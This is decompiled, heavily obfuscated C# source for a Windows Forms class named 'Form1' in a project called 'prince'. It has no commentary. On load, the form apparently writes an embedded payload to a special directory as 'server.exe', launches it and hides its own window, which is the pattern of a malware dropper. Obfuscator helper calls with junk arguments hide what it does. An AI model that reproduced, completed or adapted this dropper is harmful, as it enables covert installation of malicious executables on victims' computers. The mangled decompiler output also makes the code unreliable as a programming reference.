using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Security;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using ns0;
using prince.My;

namespace prince;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0;

	private IContainer icontainer_0;

	private Class12.Class13.Class14 class14_0 = new Class12.Class13.Class14();

	[SecuritySafeCritical]
	static Form1()
	{
		Class3.Class5.smethod_2();
		list_0 = new List<WeakReference>();
	}

	public Form1()
	{
		Class3.smethod_9<EventHandler, Form>((Form)(object)this, (EventHandler)method_1, 'Ϻ', 'Ο');
		smethod_0(this);
		method_0();
	}

	private static void smethod_0(object object_0)
	{
		List<WeakReference> gparam_ = list_0;
		bool bool_ = false;
		checked
		{
			try
			{
				Class3.smethod_6((object)gparam_, ref bool_, 71, '\\');
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference gparam_2 = (WeakReference)(ISerializable)list_0[num3];
						if (Class3.Class5.Class6.smethod_0(gparam_2, 'ß', 129))
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(Class3.Class5.smethod_3(object_0, 789, 839)));
			}
			finally
			{
				if (bool_)
				{
					Class12.Class13.smethod_0((object)gparam_, (short)501, (short)435);
				}
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void method_0()
	{
		Class9.smethod_3<Control>((Control)(object)this, (short)812, (short)797);
		SizeF sizeF_ = new SizeF(6f, 13f);
		Class3.Class7.smethod_2<ContainerControl>((ContainerControl)(object)this, sizeF_, 'ǌ', 'ǒ');
		Class3.smethod_10<ContainerControl>((ContainerControl)(object)this, (AutoScaleMode)1, (short)255, (short)190);
		Size size_ = new Size(284, 262);
		Class3.Class5.Class6.smethod_1<Form>((Form)(object)this, size_, (short)733, '\u02f8');
		Class9.smethod_4<Control, string>((Control)(object)this, "Form1", 463, (short)437);
		Class12.Class13.smethod_3<Form, string>((Form)(object)this, "Form1", '\u0310', 814);
		Class12.Class16.smethod_1<Control>((Control)(object)this, bool_0: false, (short)161, (short)176);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_1(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string gparam_ = default(string);
		string gparam_2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					Class3.Class5.smethod_4(140, 'ä');
					num3 = -2;
					goto IL_0013;
				case 185:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 1:
								break;
							case 0:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0013;
						case 3:
							goto IL_0025;
						case 4:
							goto IL_005f;
						case 5:
							goto IL_007c;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 0:
							goto end_IL_0001;
						case 7:
							goto IL_012c;
						}
						goto default;
					}
					IL_007c:
					num = 5;
					Class3.Class7.smethod_5(gparam_, Class8.smethod_0(), 'ĉ', 373);
					break;
					IL_005f:
					num = 4;
					gparam_ = (string)(IConvertible)Class3.Class5.smethod_6(gparam_2, "server.exe", 649, 686);
					goto IL_007c;
					IL_0013:
					num = 2;
					class14_0.int_0 = 1000;
					goto IL_0025;
					IL_0025:
					num = 3;
					gparam_2 = (string)(IEquatable<string>)Class3.Class7.smethod_4<SpecialDirectoriesProxy>(Class3.Class5.smethod_5<FileSystemProxy>(Class3.Class7.smethod_3<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 663, 713), 'ǋ', 425), 391, (short)399);
					goto IL_005f;
					end_IL_0001_2:
					break;
				}
				num = 6;
				Class3.smethod_11(gparam_, 920, 970);
				Class3.Class5.smethod_4(854, '\u033f');
				goto IL_012c;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				Class10.smethod_1((Exception)obj, 'ì', 138);
				try0001_dispatch = 185;
				continue;
			}
			break;
			IL_012c:
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return;
		}
		throw Class10.Class11.smethod_5(-2146828237, 1005, 1000);
	}
}
